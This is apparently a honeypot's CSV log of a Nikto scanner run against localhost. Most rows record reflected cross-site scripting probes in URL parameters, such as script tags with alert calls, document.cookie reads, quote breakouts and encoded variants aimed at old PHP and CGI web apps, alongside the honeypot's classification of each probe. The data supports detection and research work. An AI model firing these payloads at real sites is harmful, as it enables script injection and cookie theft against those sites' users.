method,path,headers/host,headers/sec-ch-ua,headers/sec-ch-ua-mobile,headers/sec-ch-ua-platform,headers/accept-language,headers/upgrade-insecure-requests,headers/user-agent,headers/accept,headers/sec-fetch-site,headers/sec-fetch-mode,headers/sec-fetch-user,headers/sec-fetch-dest,headers/accept-encoding,headers/cookie,headers/connection,uuid,peer/ip,peer/port,status,cookies/sess_uuid,response_msg/version,response_msg/response/message/detection/name,response_msg/response/message/detection/order,response_msg/response/message/detection/type,response_msg/response/message/detection/version,response_msg/response/message/sess_uuid,timestamp,headers/referer,cookies/ sess_uuid,headers/content-type,headers/content-length,response_msg/response/message/detection/payload/value,response_msg/response/message/detection/payload/page,post_data/dump_sql,post_data/method,post_data/service_name
GET,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000782),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,edd66840-1a47-4767-bc65-bcc3b08374f7,2025-05-06T05:13:02.649621,,,,,,,,,
GET,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000783),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,68344a1f-e46c-4b3f-888a-856036549c55,2025-05-06T05:13:02.669880,,,,,,,,,
GET,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000784),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,75f04b3d-dc13-42d0-bb17-0ac36569aa9f,2025-05-06T05:13:02.690144,,,,,,,,,
GET,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000785),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,84f9977a-9354-4984-aa02-0610f879e74a,2025-05-06T05:13:02.711594,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000786),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,a80f22fb-e8a4-4576-917e-5736b8f2fdea,2025-05-06T05:13:02.751562,,,,,"<script>alert('Vulnerable')</script>
<script>alert('Vulnerable')</script>
<script>alert('Vulnerable')</script>",/index.html,,,
GET,/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000787),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,67cfcb14-0bf7-4cdc-b920-e04af1f7ecfa,2025-05-06T05:13:02.790759,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000788),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,3153d626-3cd7-4fd6-aca2-d0bd097d2463,2025-05-06T05:13:02.830990,,,,,,,,,
GET,"/shop/normal_html.cgi?file=&lt;script&gt;alert(\""Vulnerable\"")&lt;/script&gt;",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000789),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,58f97e8c-3a81-45cb-9174-7e10bc9d8df7,2025-05-06T05:13:02.850974,,,,,,,,,
GET,/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000790),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,7ab7ede7-d370-4f2f-bccf-f046f2b096ff,2025-05-06T05:13:02.872164,,,,,,,,,
POST,"/servlet/custMsg?guestName=<script>alert(\""Vulnerable\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000791),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,unknown,0,1,0.6.0,49f25c99-4515-455f-96a6-3961f6c0d80b,2025-05-06T05:13:02.892652,,,application/x-www-form-urlencoded,0,,,,,
POST,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000792),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,unknown,0,1,0.6.0,0c6c7ea8-b77d-4ae6-b2e2-d8a45e4f4811,2025-05-06T05:13:02.916638,,,application/x-www-form-urlencoded,0,,,,,
GET,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000793),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,e0be35d0-3dd8-4f63-9622-3eb304c200f5,2025-05-06T05:13:02.937534,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000794),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,b3275c1c-11a8-4552-9920-3d9836f7bbbf,2025-05-06T05:13:02.977416,,,,,,,,,
GET,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000795),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,f585ba81-6f85-4036-8db0-525dcd0b4973,2025-05-06T05:13:02.999665,,,,,<script>alert(document.cookie);</script>,/index.html,,,
GET,"/search.php?zoom_query=<script>alert(\""hello\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000796),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,e5cc9c77-931a-48ab-a762-1c1321373e09,2025-05-06T05:13:03.039835,,,,,"<script>alert(\""hello\"")</script>",/index.html,,,
GET,/search.php?searchstring=<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000797),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,ae7b2e2f-aabb-43fa-b45f-da76046a4e4a,2025-05-06T05:13:03.078275,,,,,<script>alert(document.cookie)</script>,/index.html,,,
GET,"/search.php?searchfor=\""><script>alert(1776)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000798),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,0764d723-8efc-47ed-99dd-bab79b6cc704,2025-05-06T05:13:03.118211,,,,,"\""><script>alert(1776)</script>",/index.html,,,
GET,/search.asp?term=<%00script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000799),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,d0761c2b-c813-486d-a96e-7c9eb01b2898,2025-05-06T05:13:03.156611,,,,,< script>alert('Vulnerable')</script>,/index.html,,,
GET,/script>alert('Vulnerable')</script>.cfm,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000800),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,d3b78f67-a665-4ecb-b1c5-dbd8ac2be1ec,2025-05-06T05:13:03.194215,,,,,,,,,
GET,/samples/search.dll?query=<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000801),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,8e13dae0-b3a4-4d55-9445-015f5adf0a90,2025-05-06T05:13:03.215763,,,application/x-www-form-urlencoded,10,<script>alert(document.cookie)</script>,/index.html,,,
GET,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000802),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,9f9bf381-6b74-49fd-89d8-aa47c6bd4bbd,2025-05-06T05:13:03.256380,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000803),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,2dbad131-f6a9-47af-a77e-ef69c9132bab,2025-05-06T05:13:03.296816,,,,,,,,,
GET,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000805),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,cf6b948e-ade2-4aa2-bff2-8cc8b5048f0c,2025-05-06T05:13:03.317441,,,,,<script>alert('Vulnerable');</script>,/index.html,,,
GET,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000806),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,d814ddfb-f8f4-4797-9e44-5f443edc255e,2025-05-06T05:13:03.345350,,,,,"B""><script>alert('Vulnerable')</script><a s=""",/index.html,,,
GET,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000807),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,8f1c3dfe-d1b7-4d64-879f-18f79635b47c,2025-05-06T05:13:03.373290,,,,,,,,,
GET,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000808),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,b05e67c3-6451-406e-9e2f-e470ce72a03b,2025-05-06T05:13:03.388553,,,,,,,,,
GET,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000809),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,6948e84e-350e-41fc-97ed-c60037589f0b,2025-05-06T05:13:03.403429,,,,,"10\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000810),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,f50fbf4d-ffdb-4ec8-935b-a93e550cd19f,2025-05-06T05:13:03.431194,,,,,"10\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000811),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,bb981d0c-0113-407b-87f5-4ae3e207c1e1,2025-05-06T05:13:03.470912,,,,,"1  \""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000812),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,fbf9536a-46c0-4006-8f3f-94422d65e5f4,2025-05-06T05:13:03.512703,,,,,"1  \""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000813),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,3d736053-3812-4ab1-89e2-26188dd7a6fb,2025-05-06T05:13:03.551597,,,,,"<script>alert (\""Vulnerable\"")</script>
<script>alert (\""Vulnerable\"")</script>",/index.html,,,
GET,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000814),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,13aa9421-d41e-4e94-93f1-649f50519a47,2025-05-06T05:13:03.595530,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000815),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,991c70ff-baed-4d2d-93b6-9e26163c6ae8,2025-05-06T05:13:03.635785,,,,,<script>alert(Vulnerable)</script>,/index.html,,,
GET,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000816),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,79e19b1a-2701-4773-aac3-615bfa7bf0da,2025-05-06T05:13:03.675584,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000817),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,36098d48-5c3d-43d1-a5e3-90ccf798aba4,2025-05-06T05:13:03.713956,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/phpimageview.php?pic=javascript:alert(8754),localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000818),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,a5d4cc1a-85ae-4bf0-81fb-b66c2e9cc57a,2025-05-06T05:13:03.752559,,,application/x-www-form-urlencoded,1,,,,,
GET,/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000819),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,ff236b6a-b923-4930-8a98-38feb9055f56,2025-05-06T05:13:03.773855,,,,,<script>alert('Vulnerable');</script>,/index.html,,,
GET,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000820),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,c50506a8-ac1c-4444-b747-ab5cf4e70e4e,2025-05-06T05:13:03.812047,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000821),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,96a6263f-205e-4589-b7b5-f4a89a4dc7a6,2025-05-06T05:13:03.852924,,,,,"\"">\""<script>javascript:alert(document.cookie)</script>",/index.html,,,
GET,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000822),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,013fe6ef-f0fd-408f-81be-0070bf0f0c06,2025-05-06T05:13:03.894141,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000823),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,85022421-ee95-4753-bb54-709d1d0c2315,2025-05-06T05:13:03.920850,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000825),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,ccd4cae5-96a7-495a-bf3d-65bf36c73e42,2025-05-06T05:13:03.947381,,,,,,,,,
GET,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000826),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,40ea55a2-8951-41bf-81e7-26ffbce61bcb,2025-05-06T05:13:03.963690,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000827),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,173e1fa3-8c57-40cd-9d70-7a9539ad1cf8,2025-05-06T05:13:04.003166,,,,,<script>alert(document.domain);</script>,/index.html,,,
GET,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000828),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,a686dab1-eb8a-4149-8291-e4fc4e0860be,2025-05-06T05:13:04.044353,,,,,,,,,
GET,"/node/view/666\""><script>alert(document.domain)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000829),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,6a8ae4df-61c6-48bc-b65b-7f00a65d194b,2025-05-06T05:13:04.063192,,,,,,,,,
GET,/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000830),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,2d02d1f3-c882-4a99-ab89-6c4ae98ce218,2025-05-06T05:13:04.083700,,,,,<script>alert(document.cookie)</script>,/index.html,,,
GET,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000831),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,c6f6b4fb-6a9e-48a2-b383-23f580ed55f4,2025-05-06T05:13:04.121756,,,,,</script><script>alert('Vulnerable')/<script>,/index.html,,,
GET,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000832),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,8298a872-5960-4f18-8faa-6e4e45890e06,2025-05-06T05:13:04.161300,,,,,,,,,
GET,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000833),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,0a7ae281-fe62-490f-a58c-05fc1564538b,2025-05-06T05:13:04.183052,,,,,,,,,
GET,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000834),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,b9e0f59e-f553-4846-b16e-629f68020255,2025-05-06T05:13:04.203144,,,,,,,,,
GET,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000835),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,index,1,1,0.6.0,06fd9146-844b-454f-93ca-dcef59f37bfa,2025-05-06T05:13:04.224969,,,,,,,,,
GET,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000836),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,923200a9-0633-4980-bb82-327f4d30c261,2025-05-06T05:13:04.247254,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000837),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,a331a3b6-682b-4dc8-b9d2-400d2e7039b5,2025-05-06T05:13:04.287503,,,,,"\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000838),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,9c9961c8-ff0a-48e0-a1b8-ff5ecebc8810,2025-05-06T05:13:04.327329,,,,,"\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000839),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,9778e1e0-db1a-4a39-b69e-107c74c1827b,2025-05-06T05:13:04.367275,,,,,"\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000840),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,690952e7-613f-4ca7-8cdb-8bc73cffd008,2025-05-06T05:13:04.407667,,,,,<script>alert(document.cookie);</script>,/index.html,,,
GET,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000841),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59232,200,,0.6.0,xss,3,2,0.6.0,9c46b3db-68e4-41f0-b78b-72618d454dcd,2025-05-06T05:13:04.447220,,,,,}--></style><script>alert('Vulnerable')</script>,/index.html,,,
